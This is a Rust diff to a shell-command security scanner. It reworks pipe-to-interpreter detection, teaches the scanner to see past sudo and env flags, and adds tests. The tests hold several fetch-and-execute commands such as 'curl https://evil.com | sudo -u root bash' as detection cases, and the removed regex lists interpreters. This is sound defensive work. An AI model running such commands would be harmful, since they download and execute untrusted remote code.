@@ -1,14 +1,5 @@
-use once_cell::sync::Lazy;
-use regex::Regex;
-
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
-
-static PIPE_TO_INTERPRETER: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(
-        r"(?i)\|\s*(?:&\s*)?(?:sudo\s+|env\s+|/\S*/?)*(sh|bash|zsh|dash|ksh|python|python3|node|perl|ruby|php|iex|invoke-expression)\b"
-    ).unwrap()
-});
 
 /// Run command-shape rules.
 pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
@@ -16,7 +7,11 @@ pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
     let segments = tokenize::tokenize(input, shell);
 
     // Check for pipe-to-interpreter patterns
-    if PIPE_TO_INTERPRETER.is_match(input) {
+    let has_pipe = segments.iter().any(|s| {
+        s.preceding_separator.as_deref() == Some("|")
+            || s.preceding_separator.as_deref() == Some("|&")
+    });
+    if has_pipe {
         check_pipe_to_interpreter(&segments, &mut findings);
     }
 
@@ -43,29 +38,66 @@ pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
 
 /// Resolve the effective interpreter from a segment.
 /// If the command is `sudo`, `env`, or an absolute path to one of them,
-/// look at the first non-flag argument to find the real interpreter.
+/// look past flags and flag-values to find the real interpreter.
 fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
     if let Some(ref cmd) = seg.command {
         let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
         if is_interpreter(&cmd_base) {
             return Some(cmd_base);
         }
-        // If the command is sudo, env, or a path, check the first non-flag arg
-        if cmd_base == "sudo" || cmd_base == "env" {
+        if cmd_base == "sudo" {
+            // Flags that take a separate value argument
+            let sudo_value_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
+            let mut skip_next = false;
             for arg in &seg.args {
-                let arg_trimmed = arg.trim();
-                if arg_trimmed.starts_with('-') {
+                if skip_next {
+                    skip_next = false;
                     continue;
                 }
-                let arg_base = arg_trimmed
-                    .rsplit('/')
-                    .next()
-                    .unwrap_or(arg_trimmed)
-                    .to_lowercase();
-                if is_interpreter(&arg_base) {
-                    return Some(arg_base);
+                let trimmed = arg.trim();
+                if trimmed.starts_with("--") {
+                    // --user=root: long flag with =, skip entirely
+                    // --user root: long flag without =, skip next arg
+                    if !trimmed.contains('=') {
+                        skip_next = true;
+                    }
+                    continue;
                 }
-                // If it's not an interpreter, it's the actual command (not an interpreter)
+                if trimmed.starts_with('-') {
+                    if sudo_value_flags.contains(&trimmed) {
+                        skip_next = true;
+                    }
+                    continue;
+                }
+                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
+                if is_interpreter(&base) {
+                    return Some(base);
+                }
+                break;
+            }
+        } else if cmd_base == "env" {
+            let env_value_flags = ["-u"];
+            let mut skip_next = false;
+            for arg in &seg.args {
+                if skip_next {
+                    skip_next = false;
+                    continue;
+                }
+                let trimmed = arg.trim();
+                if trimmed.starts_with('-') {
+                    if env_value_flags.contains(&trimmed) {
+                        skip_next = true;
+                    }
+                    continue;
+                }
+                // VAR=val assignments
+                if trimmed.contains('=') {
+                    continue;
+                }
+                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
+                if is_interpreter(&base) {
+                    return Some(base);
+                }
                 break;
             }
         }
@@ -212,4 +244,70 @@ fn is_interpreter(cmd: &str) -> bool {
             | "iex"
             | "invoke-expression"
     )
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_pipe_sudo_flags_detected() {
+        let findings = check("curl https://evil.com | sudo -u root bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )),
+            "should detect pipe through sudo -u root bash"
+        );
+    }
+
+    #[test]
+    fn test_pipe_sudo_long_flag_detected() {
+        let findings =
+            check("curl https://evil.com | sudo --user=root bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )),
+            "should detect pipe through sudo --user=root bash"
+        );
+    }
+
+    #[test]
+    fn test_pipe_env_var_assignment_detected() {
+        let findings = check("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )),
+            "should detect pipe through env VAR=1 bash"
+        );
+    }
+
+    #[test]
+    fn test_pipe_env_u_flag_detected() {
+        let findings = check("curl https://evil.com | env -u HOME bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )),
+            "should detect pipe through env -u HOME bash"
+        );
+    }
+
+    #[test]
+    fn test_pipe_env_s_flag_detected() {
+        let findings = check("curl https://evil.com | env -S bash -x", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )),
+            "should detect pipe through env -S bash -x"
+        );
+    }
 }
